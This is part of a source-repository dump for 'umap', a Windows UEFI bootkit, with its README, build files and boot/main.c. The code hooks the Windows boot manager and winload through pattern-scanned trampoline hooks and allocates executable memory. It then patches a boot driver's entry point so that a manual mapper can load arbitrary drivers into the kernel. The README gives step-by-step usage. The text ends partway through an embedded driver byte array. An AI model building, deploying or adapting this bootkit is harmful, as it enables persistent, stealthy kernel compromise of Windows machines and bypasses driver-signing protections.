Project Path: arc_btbd_umap_15hiy12j

Source Tree:

```txt
arc_btbd_umap_15hiy12j
├── README.md
├── boot
│   ├── boot.default.props
│   ├── boot.props
│   ├── boot.vcxproj
│   ├── boot.vcxproj.filters
│   ├── main.c
│   ├── mapper.h
│   ├── stdafx.h
│   ├── util.c
│   └── util.h
├── mapper
│   ├── main.c
│   ├── mapper.filters
│   ├── mapper.vcxproj
│   ├── mapper.vcxproj.filters
│   ├── stdafx.h
│   ├── util.c
│   └── util.h
└── umap
    ├── main.c
    ├── umap.vcxproj
    └── umap.vcxproj.filters

```

`README.md`:

```md
# umap

Windows UEFI bootkit that loads a generic driver manual mapper without using a UEFI runtime driver.

# Usage

1. Setup a FAT32 formatted flashdrive with the following filesystem structure: `\EFI\Boot\bootx64.efi` where `bootx64.efi` is the compiled bootkit.

2. Boot from the flashdrive.

3. Use the usermode program `umap` to manually map a driver. The driver must be designed to function without a real driver object. However, in place of the driver object parameter is a pointer to the pool allocated for the driver if needed.

    - For example: `umap test.sys`

# Compiling

The `mapper` and `umap` projects can both be compiled using standard Visual Studio (with WDK for `mapper`). Keep in mind that any changes to `mapper` must be updated in its corresponding bootkit resource. One could also just replace `mapper` with their own driver (make sure to undo the bootkit hook), which renders the usermode component irrelevant. By default, the mapper's `DriverEntry` is called before the boot-time driver `acpiex.sys` is initialized (typically the 2nd driver in the load order after WDF). This can be easily changed if needed.

The bootkit by default expects an `edk2` directory in the repository's root with the EDK2 header and library files combined. You can use VisualUEFI for both of these, then simply combine the directories. Or, change the project layout to fit your UEFI development environment.

# Note

This PoC was only tested on Windows 10 1803, 1809, 1903, 1909, and 2004.
```

`boot/boot.default.props`:

```props
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ImportGroup Label="PropertySheets" />
  <PropertyGroup Label="UserMacros">
    <EDK_PATH>..\edk2</EDK_PATH>
  </PropertyGroup>
  <PropertyGroup>
    <IncludePath>$(EDK_PATH)\MdePkg\Include;$(EDK_PATH)\MdePkg\Include\X64;$(EDK_PATH)\ShellPkg\Include;$(EDK_PATH)\CryptoPkg\Include</IncludePath>
    <LibraryPath>$(EDK_PATH)\$(Platform)\$(Configuration)</LibraryPath>
  </PropertyGroup>
  <PropertyGroup Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>$(DefaultPlatformToolset)</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <ItemGroup>
    <BuildMacro Include="EDK_PATH">
      <Value>$(EDK_PATH)</Value>
      <EnvironmentVariable>true</EnvironmentVariable>
    </BuildMacro>
  </ItemGroup>
</Project>

```

`boot/boot.props`:

```props
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ImportGroup Label="PropertySheets" />
  <PropertyGroup>
    <GenerateManifest />
    <IntDir>$(SolutionDir)$(Platform)\$(Configuration)\obj\$(TargetName)\</IntDir>
    <OutDir>$(SolutionDir)$(Platform)\$(Configuration)\</OutDir>
    <TargetExt>.efi</TargetExt>
  </PropertyGroup>
  <ItemDefinitionGroup>
    <ClCompile>
      <WholeProgramOptimization>true</WholeProgramOptimization>
      <WarningLevel>Level4</WarningLevel>
      <TreatWarningAsError>true</TreatWarningAsError>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <Optimization>MinSpace</Optimization>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <OmitFramePointers>true</OmitFramePointers>
      <InlineFunctionExpansion>AnySuitable</InlineFunctionExpansion>
      <ExceptionHandling>SyncCThrow</ExceptionHandling>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ControlFlowGuard>false</ControlFlowGuard>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <ForcedIncludeFiles>..\edk2\BaseLib\vshacks.h</ForcedIncludeFiles>
      <CallingConvention />
      <TreatWChar_tAsBuiltInType />
      <StringPooling>true</StringPooling>
      <RuntimeTypeInfo>false</RuntimeTypeInfo>
      <ForceConformanceInForLoopScope />
      <AdditionalOptions>/Gs32768 %(AdditionalOptions)</AdditionalOptions>
      <ErrorReporting />
      <FloatingPointModel />
    </ClCompile>
    <Link>
      <IgnoreAllDefaultLibraries>true</IgnoreAllDefaultLibraries>
      <AdditionalDependencies>UefiHiiLib.lib;UefiHiiServicesLib.lib;UefiSortLib.lib;UefiShellLib.lib;GlueLib.lib;BaseLib.lib;BaseDebugPrintErrorLevelLib.lib;BasePrintLib.lib;UefiLib.lib;UefiBootServicesTableLib.lib;UefiRuntimeServicesTableLib.lib;UefiDevicePathLibDevicePathProtocol.lib;UefiDebugLibConOut.lib;UefiMemoryLib.lib;UefiMemoryAllocationLib.lib;BaseSynchronizationLib.lib;UefiFileHandleLib.lib</AdditionalDependencies>
      <GenerateDebugInformation>DebugFastLink</GenerateDebugInformation>
      <SubSystem>EFI Boot Service Driver</SubSystem>
      <Driver>Driver</Driver>
      <OptimizeReferences>true</OptimizeReferences>
      <EnableCOMDATFolding />
      <LinkTimeCodeGeneration>UseFastLinkTimeCodeGeneration</LinkTimeCodeGeneration>
      <BaseAddress>0</BaseAddress>
      <SectionAlignment>32</SectionAlignment>
      <ImageHasSafeExceptionHandlers>false</ImageHasSafeExceptionHandlers>
      <RandomizedBaseAddress />
      <DataExecutionPrevention />
      <ManifestFile />
      <AllowIsolation />
      <EnableUAC />
      <UACExecutionLevel />
      <UACUIAccess />
      <TypeLibraryResourceID />
      <AdditionalOptions>/OPT:ICF=10 /IGNORE:4001 /IGNORE:4254 /IGNORE:4281 %(AdditionalOptions)</AdditionalOptions>
      <MergeSections>.rdata=.data</MergeSections>
      <SpecifySectionAttributes>.xdata,D</SpecifySectionAttributes>
      <LinkErrorReporting />
      <ProfileGuidedDatabase />
      <EntryPointSymbol>EfiMain</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
</Project>

```

`boot/boot.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{79D78FD5-8F41-442F-944E-81774DC9DF39}</ProjectGuid>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Label="Configuration" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <PlatformToolset>v142</PlatformToolset>
  </PropertyGroup>
  <Import Project="$(SolutionDir)\boot.default.props" />
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings" />
  <Import Project="$(SolutionDir)\boot.props" />
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets" />
  <ItemDefinitionGroup>
    <Link>
      <AdditionalDependencies>UefiApplicationEntryPoint.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <SubSystem>EFI Application</SubSystem>
      <GenerateDebugInformation Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</GenerateDebugInformation>
    </Link>
    <ClCompile>
      <TreatWarningAsError Condition="'$(Configuration)|$(Platform)'=='Release|x64'">true</TreatWarningAsError>
      <RuntimeLibrary Condition="'$(Configuration)|$(Platform)'=='Release|x64'">MultiThreaded</RuntimeLibrary>
      <BufferSecurityCheck Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</BufferSecurityCheck>
      <ControlFlowGuard Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.c" />
    <ClCompile Include="util.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="mapper.h" />
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="util.h" />
  </ItemGroup>
</Project>
```

`boot/boot.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Header Files">
      <UniqueIdentifier>{1bb1e3e7-3d88-45c4-861a-b3afcff9fd29}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files">
      <UniqueIdentifier>{dcae272e-95fb-445d-bcde-4502ced9bcae}</UniqueIdentifier>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{297f9290-d3fe-4cca-b1fb-43cb37aa1c6b}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="util.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="mapper.h">
      <Filter>Resource Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="util.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`boot/main.c`:

```c
#include "mapper.h"
#include "stdafx.h"

CHAR8 *gEfiCallerBaseName = "boot";
UINT32 _gUefiDriverRevision = 0;

EFI_EXIT_BOOT_SERVICES ExitBootServicesOriginal;

UINT8 ImgArchStartBootApplicationOriginal[JMP_SIZE];
IMG_ARCH_START_BOOT_APPLICATION ImgArchStartBootApplication;

UINT8 BlImgAllocateImageBufferOriginal[JMP_SIZE];
BL_IMG_ALLOCATE_IMAGE_BUFFER BlImgAllocateImageBuffer;

UINT8 OslFwpKernelSetupPhase1Original[JMP_SIZE];
OSL_FWP_KERNEL_SETUP_PHASE_1 OslFwpKernelSetupPhase1;

struct {
    VOID *Base;
    UINT32 Size;

    // For 64-bit UEFI platforms, this naming is misleading as the boot process is
    // always in long mode (ignoring AP startup). The point is that when winload
    // switches to its own custom context, boot services cannot be invoked hence
    // saving the status in a global. /aside
    CHAR16 *ProtectedModeError;
    EFI_STATUS ProtectedModeStatus;
} winload = { NULL };

struct {
    VOID *AllocatedBuffer;
    EFI_STATUS AllocatedBufferStatus;
} mapper = { NULL };

// UEFI entrypoint
EFI_STATUS EFIAPI UefiMain(EFI_HANDLE imageHandle,
    EFI_SYSTEM_TABLE *systemTable) {
    gST->ConOut->ClearScreen(gST->ConOut);
    gST->ConOut->SetAttribute(gST->ConOut, EFI_WHITE | EFI_BACKGROUND_BLACK);

    // Locate the Windows EFI bootmgr
    EFI_DEVICE_PATH *bootmgrPath = GetWindowsBootmgrDevicePath();
    if (!bootmgrPath) {
        Print(L"Failed to find the Windows EFI bootmgr\n");
        gBS->Stall(SEC_TO_MICRO(2));

        return EFI_NOT_FOUND;
    }

    EFI_STATUS status = SetBootCurrentToWindowsBootmgr();
    if (EFI_ERROR(status)) {
        Print(L"Failed to set BootCurrent to Windows EFI bootmgr\n");
        gBS->Stall(SEC_TO_MICRO(2));

        FreePool(bootmgrPath);
        return status;
    }

    // Load the Windows EFI bootmgr
    EFI_HANDLE bootmgrHandle;
    status =
        gBS->LoadImage(TRUE, imageHandle, bootmgrPath, NULL, 0, &bootmgrHandle);

    if (EFI_ERROR(status)) {
        Print(L"Failed to load the Windows EFI bootmgr: %r\n", status);
        gBS->Stall(SEC_TO_MICRO(2));

        FreePool(bootmgrPath);
        return status;
    }

    FreePool(bootmgrPath);

    // Setup the hook chain
    status = SetupHooks(bootmgrHandle);
    if (EFI_ERROR(status)) {
        Print(L"Failed to setup hooks: %r\n", status);
        gBS->Stall(SEC_TO_MICRO(2));

        gBS->UnloadImage(bootmgrHandle);
        return status;
    }

    // Start the Windows EFI bootmgr
    status = gBS->StartImage(bootmgrHandle, NULL, NULL);
    if (EFI_ERROR(status)) {
        Print(L"Failed to start the Windows EFI bootmgr: %r\n", status);
        gBS->Stall(SEC_TO_MICRO(2));

        gBS->UnloadImage(bootmgrHandle);
        return status;
    }

    return EFI_SUCCESS;
}

// Sets up the hook chain from bootmgr -> winload -> ntoskrnl
EFI_STATUS EFIAPI SetupHooks(EFI_HANDLE bootmgrHandle) {
    // Get the bootmgr image from the image handle
    EFI_LOADED_IMAGE *bootmgr;
    EFI_STATUS status = gBS->HandleProtocol(
        bootmgrHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&bootmgr);

    if (EFI_ERROR(status)) {
        Print(L"Failed to get the boot manager image: %r\n", status);
        return status;
    }

    // Hook ImgArchStartBootApplication to setup winload hooks
    VOID *func = FindPattern(bootmgr->ImageBase, bootmgr->ImageSize,
        "\x48\x8B\xC4\x48\x89\x58\x20\x44\x89\x40\x18\x48"
        "\x89\x50\x10\x48\x89\x48\x08\x55\x56\x57\x41\x54",
        "xxxxxxxxxxxxxxxxxxxxxxxx");

    if (!func) {
        Print(L"Failed to find ImgArchStartBootApplication\n");
        return EFI_NOT_FOUND;
    }

    ImgArchStartBootApplication =
        (IMG_ARCH_START_BOOT_APPLICATION)TrampolineHook(
            (VOID *)ImgArchStartBootApplicationHook, func,
            ImgArchStartBootApplicationOriginal);

    return EFI_SUCCESS;
}

// Called from bootmgr to start the winload image
EFI_STATUS EFIAPI ImgArchStartBootApplicationHook(VOID *appEntry,
    VOID *imageBase,
    UINT32 imageSize,
    UINT8 bootOption,
    VOID *returnArguments) {

    TrampolineUnHook((VOID *)ImgArchStartBootApplication,
        ImgArchStartBootApplicationOriginal);

    winload.Base = imageBase;
    winload.Size = imageSize;

    // Find and hook OslFwpKernelSetupPhase1 to get a pointer to ntoskrnl
    VOID *funcCall =
        FindPattern(imageBase, imageSize,
            "\x74\x07\xE8\x00\x00\x00\x00\x8B\xD8", "xxx????xx");

    if (!funcCall) {
        Print(L"Failed to find OslExecuteTransition\n");
        gBS->Stall(SEC_TO_MICRO(2));

        return ImgArchStartBootApplication(appEntry, imageBase, imageSize,
            bootOption, returnArguments);
    }

    funcCall = FindPattern(RELATIVE_ADDR((UINT8 *)funcCall + 2, 5), 0x4F,
        "\x48\x8B\xCF\xE8", "xxxx");

    if (!funcCall) {
        Print(L"Failed to find OslFwpKernelSetupPhase1\n");
        gBS->Stall(SEC_TO_MICRO(2));

        return ImgArchStartBootApplication(appEntry, imageBase, imageSize,
            bootOption, returnArguments);
    }

    OslFwpKernelSetupPhase1 = (OSL_FWP_KERNEL_SETUP_PHASE_1)TrampolineHook(
        (VOID *)OslFwpKernelSetupPhase1Hook,
        RELATIVE_ADDR((UINT8 *)funcCall + 3, 5),
        OslFwpKernelSetupPhase1Original);

    // Hook BlImgAllocateImageBuffer to allocate the mapper's buffer
    funcCall =
        FindPattern(imageBase, imageSize,
            "\xE8\x00\x00\x00\x00\x4C\x8B\x6D\x60", "x????xxxx");

    if (!funcCall) {
        Print(L"Failed to find BlImgAllocateImageBuffer\n");
        gBS->Stall(SEC_TO_MICRO(2));

        TrampolineUnHook((VOID *)OslFwpKernelSetupPhase1,
            OslFwpKernelSetupPhase1Original);

        return ImgArchStartBootApplication(appEntry, imageBase, imageSize,
            bootOption, returnArguments);
    }

    BlImgAllocateImageBuffer = (BL_IMG_ALLOCATE_IMAGE_BUFFER)TrampolineHook(
        (VOID *)BlImgAllocateImageBufferHook, RELATIVE_ADDR(funcCall, 5),
        BlImgAllocateImageBufferOriginal);

    // Hook ExitBootServices
    ExitBootServicesOriginal = gBS->ExitBootServices;
    gBS->ExitBootServices = ExitBootServicesHook;

    return ImgArchStartBootApplication(appEntry, imageBase, imageSize,
        bootOption, returnArguments);
}

// Called by winload to allocate image buffers in winload context, use it to
// allocate the mapper's buffer as well Hooking this instead of calling it
// within another hook alleviates some tedious setup (credits to sa413x)
EFI_STATUS EFIAPI BlImgAllocateImageBufferHook(VOID **imageBuffer,
    UINTN imageSize,
    UINT32 memoryType,
    UINT32 attributes, VOID *unused,
    UINT32 flags) {

    TrampolineUnHook((VOID *)BlImgAllocateImageBuffer,
        BlImgAllocateImageBufferOriginal);

    EFI_STATUS status = BlImgAllocateImageBuffer(
        imageBuffer, imageSize, memoryType, attributes, unused, flags);

    if (!EFI_ERROR(status) && memoryType == BL_MEMORY_TYPE_APPLICATION) {
        mapper.AllocatedBufferStatus = BlImgAllocateImageBuffer(
            &mapper.AllocatedBuffer, MAPPER_BUFFER_SIZE, memoryType,
            BL_MEMORY_ATTRIBUTE_RWX, unused, 0);

        if (EFI_ERROR(mapper.AllocatedBufferStatus)) {
            mapper.AllocatedBuffer = NULL;
        }

        // Don't hook the function again
        return status;
    }

    TrampolineHook((VOID *)BlImgAllocateImageBufferHook,
        (VOID *)BlImgAllocateImageBuffer,
        BlImgAllocateImageBufferOriginal);

    return status;
}

// Called by winload with a valid LPB in winload context before calling
// ExitBootServices
EFI_STATUS EFIAPI
OslFwpKernelSetupPhase1Hook(LOADER_PARAMETER_BLOCK *loaderParameterBlock) {
    TrampolineUnHook((VOID *)OslFwpKernelSetupPhase1,
        OslFwpKernelSetupPhase1Original);

    if (mapper.AllocatedBuffer) {
        KLDR_DATA_TABLE_ENTRY *ntoskrnl = GetModuleEntry(
            &loaderParameterBlock->LoadOrderListHead, L"ntoskrnl.exe");

        if (ntoskrnl) {
            // The target module is the module whose DriverEntry we hook
            // One can change this to load their driver (in this case the
            // mapper) at different times in the boot process
            KLDR_DATA_TABLE_ENTRY *targetModule = GetModuleEntry(
                &loaderParameterBlock->LoadOrderListHead, L"acpiex.sys");

            if (targetModule) {
                winload.ProtectedModeStatus =
                    SetupMapper(ntoskrnl, targetModule);
            } else {
                winload.ProtectedModeStatus = EFI_NOT_FOUND;
                winload.ProtectedModeError =
                    L"Failed to find target module entry";
            }
        } else {
            winload.ProtectedModeStatus = EFI_NOT_FOUND;
            winload.ProtectedModeError =
                L"Failed to find ntoskrnl module entry";
        }
    } else {
        winload.ProtectedModeStatus = mapper.AllocatedBufferStatus;
        winload.ProtectedModeError = L"Failed to allocate image memory";
    }

    return OslFwpKernelSetupPhase1(loaderParameterBlock);
}

// Sets up the mapper (in winload context)
EFI_STATUS EFIAPI SetupMapper(KLDR_DATA_TABLE_ENTRY *ntoskrnl,
    KLDR_DATA_TABLE_ENTRY *targetModule) {
    // Map the mapper
    VOID *mapperEntryPoint;
    EFI_STATUS status = MapMapper(ntoskrnl->ImageBase, &mapperEntryPoint,
        targetModule->EntryPoint);

    if (EFI_ERROR(status)) {
        return status;
    }

    // This is necessary because on <1903 the kernel will remap boot-time
    // drivers and recalculate their DriverEntry, so you cannot simply change
    // the pointer or do a standard trampoline hook and store the pointer in
    // mapper data as it will point to invalid memory after the kernel
    // initializes
    MemCopy(targetModule->EntryPoint, "\x4C\x8D\x05\xF9\xFF\xFF\xFF", // lea r8, [rip - 7]
        7);

    TrampolineHook(mapperEntryPoint, (UINT8 *)targetModule->EntryPoint + 7,
        NULL);

    return EFI_SUCCESS;
}

// Maps the driver manual mapper (in winload context)
EFI_STATUS EFIAPI MapMapper(VOID *ntoskrnlBase, VOID **entryPoint,
    VOID *targetFunction) {
    UINT8 *mapperBase = mapper.AllocatedBuffer;
    UINT8 *mapperBuffer = MAPPER_BUFFER;

    // No point in checking signature when it's controlled
    IMAGE_NT_HEADERS64 *ntHeaders =
        (IMAGE_NT_HEADERS64 *)(mapperBuffer +
            ((IMAGE_DOS_HEADER *)mapperBuffer)->e_lfanew);

    // Map headers
    MemCopy(mapperBase, mapperBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);

    // Map sections
    IMAGE_SECTION_HEADER *sections =
        (IMAGE_SECTION_HEADER *)((UINT8 *)&ntHeaders->OptionalHeader +
            ntHeaders->FileHeader.SizeOfOptionalHeader);

    for (UINT16 i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        IMAGE_SECTION_HEADER *section = &sections[i];
        if (section->SizeOfRawData) {
            MemCopy(mapperBase + section->VirtualAddress,
                mapperBuffer + section->PointerToRawData,
                section->SizeOfRawData);
        }
    }

    // Resolve ntoskrnl imports
    UINT32 importsRva =
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
        .VirtualAddress;

    if (importsRva) {
        IMAGE_IMPORT_DESCRIPTOR *importDescriptor =
            (IMAGE_IMPORT_DESCRIPTOR *)(mapperBase + importsRva);

        for (; importDescriptor->FirstThunk; ++importDescriptor) {
            IMAGE_THUNK_DATA64 *thunk =
                (IMAGE_THUNK_DATA64 *)(mapperBase +
                    importDescriptor->FirstThunk);

            IMAGE_THUNK_DATA64 *thunkOriginal =
                (IMAGE_THUNK_DATA64 *)(mapperBase +
                    importDescriptor->OriginalFirstThunk);

            for (; thunk->u1.AddressOfData; ++thunk, ++thunkOriginal) {
                UINT64 import = GetExport(
                    ntoskrnlBase,
                    ((IMAGE_IMPORT_BY_NAME *)(mapperBase +
                        thunkOriginal->u1.AddressOfData))
                    ->Name);

                if (!import) {
                    winload.ProtectedModeError =
                        L"Failed to resolve all imports";
                    return EFI_NOT_FOUND;
                }

                thunk->u1.Function = import;
            }
        }
    }

    // Resolve relocations
    IMAGE_DATA_DIRECTORY *baseRelocDir =
        &ntHeaders->OptionalHeader
        .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (baseRelocDir->VirtualAddress) {
        IMAGE_BASE_RELOCATION *reloc =
            (IMAGE_BASE_RELOCATION *)(mapperBase +
                baseRelocDir->VirtualAddress);

        for (UINT32 currentSize = 0; currentSize < baseRelocDir->Size;) {
            UINT32 relocCount =
                (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
                sizeof(UINT16);

            UINT16 *relocData =
                (UINT16 *)((UINT8 *)reloc + sizeof(IMAGE_BASE_RELOCATION));

            UINT8 *relocBase = mapperBase + reloc->VirtualAddress;

            for (UINT32 i = 0; i < relocCount; ++i, ++relocData) {
                UINT16 data = *relocData;
                UINT16 type = data >> 12;
                UINT16 offset = data & 0xFFF;

                switch (type) {
                    case IMAGE_REL_BASED_ABSOLUTE:
                        break;
                    case IMAGE_REL_BASED_DIR64: {
                        UINT64 *rva = (UINT64 *)(relocBase + offset);
                        *rva =
                            (UINT64)(mapperBase +
                                (*rva - ntHeaders->OptionalHeader.ImageBase));
                        break;
                    }
                    default:
                        winload.ProtectedModeError = L"Unsupported relocation type";
                        return EFI_UNSUPPORTED;
                }
            }

            currentSize += reloc->SizeOfBlock;
            reloc = (IMAGE_BASE_RELOCATION *)relocData;
        }
    }

    // Copy mapper data
    UINT32 exportsRva =
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
        .VirtualAddress;

    if (exportsRva) {
        IMAGE_EXPORT_DIRECTORY *exports =
            (IMAGE_EXPORT_DIRECTORY *)(mapperBase + exportsRva);

        if (exports->NumberOfNames) {
            UINT32 *funcRva =
                (UINT32 *)(mapperBase + exports->AddressOfFunctions);

            UINT16 *ordinalRva =
                (UINT16 *)(mapperBase + exports->AddressOfNameOrdinals);

            MemCopy(mapperBase + funcRva[ordinalRva[0]], targetFunction,
                MAPPER_DATA_SIZE);
        }
    }

    *entryPoint = mapperBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    return EFI_SUCCESS;
}

// Called by winload to unload boot services
EFI_STATUS EFIAPI ExitBootServicesHook(EFI_HANDLE imageHandle, UINTN mapKey) {
    if (EFI_ERROR(winload.ProtectedModeStatus)) {
        Print(L"%s: %r\n", winload.ProtectedModeError,
            winload.ProtectedModeStatus);

        gBS->Stall(SEC_TO_MICRO(2));
    } else {
        Print(L"Success\n");
    }

    gBS->ExitBootServices = ExitBootServicesOriginal;
    return gBS->ExitBootServices(imageHandle, mapKey);
}

// Locates the device path for the Windows bootmgr
EFI_DEVICE_PATH *EFIAPI GetWindowsBootmgrDevicePath() {
    UINTN handleCount;
    EFI_HANDLE *handles;
    EFI_DEVICE_PATH *devicePath = NULL;

    // Retrieve filesystem handles
    EFI_STATUS status =
        gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid,
            NULL, &handleCount, &handles);

    if (EFI_ERROR(status)) {
        Print(L"Failed to get filesystem handles: %r\n", status);
        return devicePath;
    }

    // Check each FS for the bootmgr
    for (UINTN i = 0; i < handleCount && !devicePath; ++i) {
        EFI_FILE_IO_INTERFACE *fileSystem;
        status = gBS->OpenProtocol(
            handles[i], &gEfiSimpleFileSystemProtocolGuid, (VOID **)&fileSystem,
            gImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL);

        if (EFI_ERROR(status)) {
            continue;
        }

        EFI_FILE_HANDLE volume;
        status = fileSystem->OpenVolume(fileSystem, &volume);
        if (!EFI_ERROR(status)) {
            EFI_FILE_HANDLE file;
            status = volume->Open(volume, &file, WINDOWS_BOOTMGR_PATH,
                EFI_FILE_MODE_READ, EFI_FILE_READ_ONLY);

            if (!EFI_ERROR(status)) {
                volume->Close(file);

                devicePath = FileDevicePath(handles[i], WINDOWS_BOOTMGR_PATH);
            }
        }

        gBS->CloseProtocol(handles[i], &gEfiSimpleFileSystemProtocolGuid,
            gImageHandle, NULL);
    }

    gBS->FreePool(handles);
    return devicePath;
}

// Sets BootCurrent to Windows bootmgr option
EFI_STATUS EFIAPI SetBootCurrentToWindowsBootmgr() {
    // Query boot order array
    UINTN bootOrderSize = 0;
    EFI_STATUS status =
        gRT->GetVariable(EFI_BOOT_ORDER_VARIABLE_NAME, &gEfiGlobalVariableGuid,
            NULL, &bootOrderSize, NULL);

    if (status != EFI_BUFFER_TOO_SMALL) {
        return status;
    }

    UINT16 *bootOrder = AllocatePool(bootOrderSize);
    if (!bootOrder) {
        return EFI_OUT_OF_RESOURCES;
    }

    status =
        gRT->GetVariable(EFI_BOOT_ORDER_VARIABLE_NAME, &gEfiGlobalVariableGuid,
            NULL, &bootOrderSize, bootOrder);

    if (EFI_ERROR(status)) {
        FreePool(bootOrder);
        return status;
    }

    // Try each boot option to find Windows boot manager
    BOOLEAN found = FALSE;
    for (UINTN i = 0; i < bootOrderSize / sizeof(bootOrder[0]) && !found; ++i) {
        CHAR16 variableName[0xFF];
        UnicodeSPrint(variableName, sizeof(variableName), L"Boot%04x",
            bootOrder[i]);

        UINTN bufferSize = 0;
        status = gRT->GetVariable(variableName, &gEfiGlobalVariableGuid, NULL,
            &bufferSize, NULL);

        if (status != EFI_BUFFER_TOO_SMALL) {
            break;
        }

        UINT8 *buffer = AllocatePool(bufferSize);
        if (!buffer) {
            status = EFI_OUT_OF_RESOURCES;
            break;
        }

        status = gRT->GetVariable(variableName, &gEfiGlobalVariableGuid, NULL,
            &bufferSize, buffer);

        if (EFI_ERROR(status)) {
            FreePool(buffer);
            break;
        }

        // Check the option file path list
        EFI_LOAD_OPTION *bootOption = (EFI_LOAD_OPTION *)buffer;
        CHAR16 *bootOptionDescription =
            (CHAR16 *)(buffer + sizeof(EFI_LOAD_OPTION));

        EFI_DEVICE_PATH_PROTOCOL *bootOptionPaths =
            (EFI_DEVICE_PATH_PROTOCOL *)(bootOptionDescription +
                StrLen(bootOptionDescription) + 1);

        if (bootOption->FilePathListLength) {
            // Only the first path is needed
            CHAR16 *bootOptionPath =
                ConvertDevicePathToText(&bootOptionPaths[0], FALSE, TRUE);

            if (bootOptionPath) {
                // Convert it to lowercase
                for (CHAR16 *c = bootOptionPath; *c; ++c) {
                    if (*c >= 'A' && *c <= 'Z') {
                        *c += ('a' - 'A');
                    }
                }

                // Check if it contains the bootmgr path
                if (StrStr(bootOptionPath, WINDOWS_BOOTMGR_PATH)) {
                    // If so, update BootCurrent to this option
                    status = gRT->SetVariable(EFI_BOOT_CURRENT_VARIABLE_NAME,
                        &gEfiGlobalVariableGuid,
                        EFI_VARIABLE_BOOTSERVICE_ACCESS |
                        EFI_VARIABLE_RUNTIME_ACCESS,
                        sizeof(UINT16), &bootOrder[i]);

                    if (!EFI_ERROR(status)) {
                        found = TRUE;
                    }
                }

                FreePool(bootOptionPath);
            }
        }

        FreePool(buffer);
    }

    FreePool(bootOrder);

    if (!EFI_ERROR(status) && !found) {
        status = EFI_NOT_FOUND;
    }

    return status;
}

EFI_STATUS EFIAPI UefiUnload(EFI_HANDLE imageHandle) { return EFI_SUCCESS; }
```

`boot/mapper.h`:

```h
#pragma once

STATIC UINT8 MAPPER_BUFFER[] = {
	0x00, 0x00, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	0xff, 0xff, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xd0, 0x00, 0x00, 0x00, 0x0e, 0x1f, 0xba, 0x0e, 0x00, 0xb4, 0x09, 0xcd,
	0x21, 0xb8, 0x01, 0x4c, 0xcd, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70,
	0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x20, 0x63, 0x61, 0x6e, 0x6e, 0x6f,
	0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6e, 0x20, 0x69, 0x6e, 0x20,
